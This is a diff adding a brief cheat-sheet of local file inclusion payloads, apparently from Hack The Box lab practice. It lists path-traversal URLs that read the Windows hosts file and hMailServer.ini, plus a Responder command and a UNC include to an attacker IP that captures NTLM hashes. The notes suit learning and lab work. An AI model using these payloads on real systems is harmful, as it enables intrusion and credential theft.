@@ -1,0 +1,11 @@
+LFI
+
+http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
+
+#Windows
+http://mailing.htb/download.php?file=..\..\Windows\System32\drivers\etc\hosts
+http://mailing.htb/download.php?file=..\..\..\Program+Files+(x86)\hMailServer\Bin\hMailServer.ini
+
+responder -I tun0 -v
+
+http://school.flight.htb/index.php?view=//10.10.14.59/htb
